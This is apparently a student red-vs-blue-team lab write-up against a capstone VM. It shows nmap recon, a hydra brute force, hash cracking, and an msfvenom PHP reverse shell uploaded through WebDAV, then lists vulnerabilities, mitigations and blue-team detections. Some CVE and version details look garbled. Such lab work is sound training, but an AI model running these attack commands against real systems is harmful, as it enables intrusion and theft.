# Red-vs-Blue-team-project
![image](https://user-images.githubusercontent.com/93951164/172183135-bcba72f9-8218-4347-b0a1-b3357e42fb22.png)

Red Team Environment
![image](https://user-images.githubusercontent.com/93951164/172183644-704fc94b-0767-4825-98a4-cc7e2236fb7c.png)


Blue Team Environment
![image](https://user-images.githubusercontent.com/93951164/172183602-e05f67a5-c68e-4f60-a6e7-8f309fdcfa65.png)



RED TEAM - Penetration Test
EXPLOITATION
Discover target IP:
To discover the target ip:
netdiscover -r <ip subnet>
 ![image](https://user-images.githubusercontent.com/93951164/172183767-b4d872a5-8284-4cef-8715-17feaaf50a54.png)



IP
Machine
192.168.1.1
Gateway IP, Hyper-V
192.168.1.100
ELK server
192.168.1.105
Capstone, target machine

Service and version scan:
nmap -sV -v 192.168.1.105
 
Port
Service
Version
Port 22
SSH
OpenSSH 7.6p1
Port 80
HTTP
Apache httpd 2.4.29

![image](https://user-images.githubusercontent.com/93951164/172183948-c5a858fd-f171-485a-a987-76f4cd11ae14.png)

![image](https://user-images.githubusercontent.com/93951164/172183970-515cea98-3528-4b92-aa5e-9c04972e3091.png)

Aggressive scan:
nmap -A -vvv 192.168.1.105
 
A simple aggressive scan reveals a web server directory structure on tcp port 80, which is a http port, and two potential usernames of employees – ashton and hannah (which will be more relevant for brute forcing later):
![image](https://user-images.githubusercontent.com/93951164/172184023-ef8199ba-6485-4260-ade2-a03d25def67e.png)


![image](https://user-images.githubusercontent.com/93951164/172422551-4dffaa9d-ac86-464f-a650-569d20cbb9dd.png)

Navigating the Webserver:
As this is a webserver, we can investigate further from a browser in the attacker machine:
![image](https://user-images.githubusercontent.com/93951164/172422581-5daef986-46c9-40b1-ac64-483e5c5e9444.png)

In a text document the blog directory we can see a 3rd potential username – Ryan, who would potentially have the highest level access as CEO:
![image](https://user-images.githubusercontent.com/93951164/172422612-c97709a2-6e6a-4c30-9c05-c857c0a665d6.png)

In the company folders directory, we can see reference to a "secret_folder" in ALL documents within this directory, which is now a target for this Penetration Test.
![image](https://user-images.githubusercontent.com/93951164/172422644-0041d2f5-40be-4006-ab6e-2fac920e6f36.png)

The meet_our_team folder confirms the three potential users, and each document references the secret_folder:
![image](https://user-images.githubusercontent.com/93951164/172422678-5e575557-6cba-42db-9670-c659ca9d2bad.png)

As we can see below, we![image](https://user-images.githubusercontent.com/93951164/172422713-0f11563d-c776-4888-82b6-5022858ca05b.png)
 will need Ashton's password to gain access to the secure hidden folder.

Vulnerability scan:
nmap -A --script=vuln -vvv 192.168.1.105
 
Returning to scanning for further recon.
Aggressive scan with a vulnerability script reveals:
Webdav vulnerability
SQL Injection vulnerability across all directories on the webserver
CVE-2017-15710 – Apache httpd vulnerability
![image](https://user-images.githubusercontent.com/93951164/172422746-c637c6c8-c595-44df-8320-9ce983be0f0d.png)



![image](https://user-images.githubusercontent.com/93951164/172422763-4e612ea6-3e38-42a9-b758-1932fd2f91b2.png)
![image](https://user-images.githubusercontent.com/93951164/172422815-19faf483-0f2a-4030-918c-070ae4a85dc9.png)

Bruteforce:
Now that we have some usernames and a main target - Ashton, using hydra we can attempt to bruteforce the login for the secret_folder.
Ashton, the CEO, had a common password within our password list. Using the following command, we could get Ashton's password.
hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"
 ![image](https://user-images.githubusercontent.com/93951164/172422842-cb592c61-9f9a-4e92-94f8-f9ed96dd2fc9.png)


SSH:
ssh ashton@192.168.1.105
 
Using Ashton's credentials we could gain ssh entry into the server.
![image](https://user-images.githubusercontent.com/93951164/172422872-1b59515f-3f5a-40df-8f58-5b2367c58b42.png)

![image](https://user-images.githubusercontent.com/93951164/172422917-2a756a6f-87dd-46f4-8a3c-8c386bc67d6a.png)

Flag 1
In the root home directory we could pickup a flag.
![image](https://user-images.githubusercontent.com/93951164/172422955-cb01a213-351e-475f-ae1b-f6a1976c4b7d.png)

Using the same credentials, we could access the protected hidden folder.
![image](https://user-images.githubusercontent.com/93951164/172422993-a22185da-843b-44ec-bd2f-bbec713fc7f4.png)

Password hash:
Within this folder was a document with instructions to connect to a corp_server. Included in the document are Ryan's hashed credentials and reference to a webdav directory

![image](https://user-images.githubusercontent.com/93951164/172423091-5a5ac7d3-11c2-4109-8157-5fe3dce6bac4.png)
![image](https://user-images.githubusercontent.com/93951164/172423112-eb8292bb-cfbf-41c5-9f04-5d78e928fc5f.png)

Th hashed md5 password was instantly cracked using Crackstation, revealing the password linux4u
![image](https://user-images.githubusercontent.com/93951164/172423132-66720285-9842-4da6-92be-1e00d171e609.png)

Webdav:
We could then login to webdav using Ryan's credentials.
![image](https://user-images.githubusercontent.com/93951164/172423152-e8a806a9-bae6-49d4-9721-a2d785386736.png)
![image](https://user-images.githubusercontent.com/93951164/172423186-65be5293-9e7d-42f6-bb78-da0f82c4361b.png)


Reverse Shell:
Msfvenom
The next task was to upload a shell script to webdav, in order to create a reverse shell.
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
 
Using msfvenom we created a payload – shell.php
![image](https://user-images.githubusercontent.com/93951164/172423436-8a31c20a-6a65-48c7-b87d-f736b0de342f.png)

Cadaver
cadaver http://192.168.1.105/webdav
 
Using cadaver and Ryan's credentials we accessed webdav, and uploaded the payload to the webdav directory.
![image](https://user-images.githubusercontent.com/93951164/172423464-f42dffe6-f9d0-43b9-92d1-b3c4a9652c2b.png)

![image](https://user-images.githubusercontent.com/93951164/172423479-23a09f87-1013-40bb-9fa2-71ca0f2b23c3.png)

Metasploit
msfconsole
use multi/handler
 
Once the payload was successfully uploaded, in order to create the reverse shell, we setup a listener using Metasploit.
![image](https://user-images.githubusercontent.com/93951164/172423496-a1667c78-d8bc-4a9d-a507-d0f8917b5c59.png)

After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a meterpreter session into their system.
![image](https://user-images.githubusercontent.com/93951164/172423507-7d43bdd7-4a5c-4a74-ba1d-66ef32a7ac12.png)

Gaining Interactive Shell:
python -c 'import pty; pty.spawn("/bin/bash")'
 ![image](https://user-images.githubusercontent.com/93951164/172423531-1cb1b1de-42a8-4063-bb1f-02b97c86a6f8.png)


Finding Flag 2:
The next flag was located in the root directory.
![image](https://user-images.githubusercontent.com/93951164/172423552-346d8498-7721-4125-ae64-3f140051a74d.png)

Exit back to meterpreter.

![image](https://user-![image](https://user-images.githubusercontent.com/93951164/172423621-787613e7-44b8-484a-9d9c-9fa83157b375.png)
images.githubusercontent.com/93951164/172423581-4892995f-5aa2-4bee-88cf-29693a2e5717.png)

Exfiltration:
The file was easily exfiltrated back to the attacker machine.
![image](https://user-images.githubusercontent.com/93951164/172423657-255354a6-6490-4d27-ba90-4bcc1a6ccffe.png)

![image](https://user-images.githubusercontent.com/93951164/172423675-b04a0e65-420f-43c8-851f-9d9a22fe869c.png)

Vulnerabilities
Webserver
1. Directory listing vulnerability. Webserver directories are open to the public and navigable in a browser.
CWE-548: Exposure of Information Through Directory Listing
https://cwe.mitre.org/data/definitions/548.html
Attackers can gather a lot of information from open directories. They can use this information and access to launch attacks and upload malicious content. These directories may also be vulnerable to path traversal in which users can navigate across to sensitive regions of the system.
Disable the ability to view directories in the browser, and disable access/password protect all directories to avoid path traversal. Sanitise input to avoid malicious SQL statements.
2. SQL Injection. Nmap revealed a possible vulnerability to SQL injection to the directories in the webserver.
This can allow attackers to enter malicious code and gain access or launch attacks.
Sanitise inputs.
3. Documents with usernames in plain text are available to the public in the webserver
CWE-312: Cleartext Storage of Sensitive Information
https://cwe.mitre.org/data/definitions/312.html
CWE-256: Unprotected Storage of Credentials
https://cwe.mitre.org/data/definitions/256.html
Attackers can use this information in bruteforce attacks. Even just one name can lead to a system breach.
Users should not be using their own names as usernames. User names should not be published anywhere, especially not a webserver.
4. Documents in the webserver give direct reference to a hidden directory with sensitive data.
These are breadcrumbs that attackers will follow, with a direct reference to a hidden directory attackers can focus attacks to access the contents of the directory.
Do not reference sensitive directories in publicly available documents. If it is necessary to mention it, then encrypt and password protect.
5. Webdav is enabled and allows uploading of malicious script.
CWE-434: Unrestricted Upload of File with Dangerous Type
https://cwe.mitre.org/data/definitions/434.html
It is easy to create a shell in the target system using a reverse shell, by opening a meterpreter session
Disable webdav
6. Missing encryption of sensitive data.
CWE-311: Missing Encryption of Sensitive Data
https://cwe.mitre.org/data/definitions/311.html
7. CWE-522: Insufficiently Protected Credentials
Users and Passwords
1. Usernames are employee first names.
These are too obvious and most likely discoverable through Google Dorking. All are high level employees of the company which are more vulnerable, and certainly easier to find in the company structure in publicly available material.
Attackers can (with very little investigation) create a wordlist of usernames of employees for bruteforcing.
Usernames should not include the person's name.
2. Ryan's password hash was printed into a document, publicly available on the webserver.
The password hash is highly confidential and vulnerable once an attacker can access it.
CWE-256: Unprotected Storage of Credentials
https://cwe.mitre.org/data/definitions/256.html
A password hash is one of the highest targets for an attacker that is trying to gain entry; being able to navigate to one in a browser through minimal effort is a critical vulnerability.
Password hashes should remain in the /etc/shadow directory with root only access in the system, and not be published or copied anywhere.
3. CWE-759: Use of a One-Way Hash without a Salt.
https://cwe.mitre.org/data/definitions/759.html
CWE-916: Use of Password Hash With Insufficient Computational Effort
https://cwe.mitre.org/data/definitions/916.html
Ryan's password is only hashed, but not salted. A password hash can be run through apps to crack the password, however a salted hash will be almost impossible to crack.
A simple hash can be cracked with tools in linux or through websites, in this case it took seconds to crack Ryan's hash.
Salt hashes.
4. CWE-521: Weak Password Requirements.
https://cwe.mitre.org/data/definitions/521.html
Passwords need to have a minimum requirement of password length and use of mixed characters and case.
linux4u is a simple phrase with very common word substitution – 4=for, u=you. and leopoldo is a common name that could easily be bruteforced with a common password list.
Require strong passwords that exclude phrases and names, minimum 8 characters, mixed characters that include a combination of lower case, upper case, special characters and numbers.
Consider implementing multi-factor authentication.
Apache 2.4.29
1. CVE-2017-15710
This potential Apache httpd vulnerability was picked up by nmap and relates to a configuration that verifies user credentials; a particular header value is searched for and if it is not present in the charset conversion table, it reverts to a fallback of 2 characters (eg. en-US becomes en). While this risk is unlikely, if there is a header value of less than 2 characters, the system may crash.
This vulnerability has the potential to force a Denial of Service attack.
As this vulnerability applies to a range of Apache httpd versions from 2.0.23 to 2.4.29, upgrading to the latest version 2.2.46 may mitigate this risk.
2. CVE-2018-1312
While this vulnerability wasn't picked up in any scans, the apache version remains vulnerable. From cve-mitre "When generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection."
With this vulnerability, an attacker would be able to replay HTTP requests across a cluster of servers (that are using a common Digest authentication configuration), whilst avoiding detection.
Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
3. CVE-2017-1283
Mod_session is configured to forward its session data to CGI applications
With this vulnerability, a remote user may influence their content by using a "Session" header.
Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
4. CVE-2017-15715
This vulnerability relates to malicious filenames, in which the end of filenames can be matched/replaced with '$'
In systems where file uploads are externally blocked, this vulnerability can be exploited to upload malicious files
Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
 
Identifying the port scan:
Filtering for Nmap:
![image](https://user-images.githubusercontent.com/93951164/172423792-5c5a7750-f0c0-4b16-a739-50a7b275f200.png)

![image](https://user-images.githubusercontent.com/93951164/172423817-525dcdc6-4112-467c-ade2-ece8cb91b4d0.png)

Monitoring requests to the " _ secret_folder _ ":
![image](https://user-images.githubusercontent.com/93951164/172423884-46ab7917-55fa-48b9-9725-387c62a8f003.png)

![image](https://user-images.githubusercontent.com/93951164/172423843-96b0e8f7-6acb-4a04-a7ec-ae10752de187.png)

![image](https://user-images.githubusercontent.com/93951164/172423911-0a9c0a2f-7cec-4b48-a2f2-3f7d06200b08.png)

Filtering for the Hydra brute force attack:
There were 346,595 bruteforce attempts made with Hydra.
![image](https://user-images.githubusercontent.com/93951164/172423935-6d2a8eed-3b68-4fda-8d2d-de5a716580e1.png)

![image](https://user-images.githubusercontent.com/93951164/172423949-5f1d0f43-0707-4cfd-bc2f-1397620f6413.png)

Finding the WebDAV connection:
A reverse shell in webdav was used 20 times.

![image](https://user-images.githubusercontent.com/93951164/172423974-d25ce4fd-dbf4-46ca-a9a6-2723909a4ac5.png)

![image](https://user-images.githubusercontent.com/93951164/172423998-2f2a280f-2c33-45b4-9eb4-18cf3011f01a.png)

 ![image](https://user-images.githubusercontent.com/93951164/172424008-ac62fffe-8d20-43ff-b2be-9ce03332453a.png)

